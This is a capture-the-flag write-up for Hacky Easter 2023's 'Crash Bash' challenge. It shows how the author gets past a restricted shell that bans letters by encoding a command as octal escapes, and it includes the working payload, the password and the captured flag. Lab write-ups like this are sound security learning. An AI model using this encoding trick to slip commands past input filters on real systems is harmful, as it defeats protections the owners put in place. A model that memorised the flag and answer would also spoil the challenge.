# Description

# Crash Bash

Can you crash the bash?

The password is `B4sh_br0TH3rs`

Connect using `nc ch.hackyeaster.com 2303`

Note: The service is restarted every hour at x:00.

## Hints

Some characters are forbidden, in the whole string you enter.

# Solution

we have a really restricted shell, no normal alphabethic characters can be used.. but we can use numbers!!

if we enter something not allowed we get:

```
$ nc ch.hackyeaster.com 2303
Welcome to Crash Bash!
To get the flag, call /printflag.sh with the password!
Enter "q" to quit.
----------------------
crashbash$ a
Invalid input, bash crashed!
crashbash$ 
```

i tried a lot around and reminded myself of this video

<https://www.youtube.com/watch?v=6D1LnMj0Yt0&ab_channel=LiveOverflow>

but here `?`, `*` and `.` were not allowed

after some more searching i found this writeup:

<https://ctftime.org/writeup/8520>

this is exactly what we have here!!

so lets try what they have done

i also found this:

<https://medium.com/@orik_/34c3-ctf-minbashmaxfun-writeup-4470b596df60>

so i used this website to convert the command i want to execute to octal numbers:

<https://onlineasciitools.com/convert-ascii-to-octal>

```
/printflag.sh B4sh_br0TH3rs
```

got to

```
057 160 162 151 156 164 146 154 141 147 056 163 150 040 102 064 163 150 137 142 162 060 124 110 063 162 163
```

and this goes into our "exploit" syntax:

```
__=$'\057\160\162\151\156\164\146\154\141\147\056\163\150\040\102\064\163\150\137\142\162\060\124\110\063\162\163';$__
```

and here is the flag! :D

```
$ nc ch.hackyeaster.com 2303
Welcome to Crash Bash!
To get the flag, call /printflag.sh with the password!
Enter "q" to quit.
----------------------
crashbash$ __=$'\057\160\162\151\156\164\146\154\141\147\056\163\150\040\102\064\163\150\137\142\162\060\124\110\063\162\163';$__
Congrats, here's your flag:
he2023{gr34t_b4sh_succ3ss!}
crashbash$ 
```

# FLAG: he2023{gr34t_b4sh_succ3ss!}
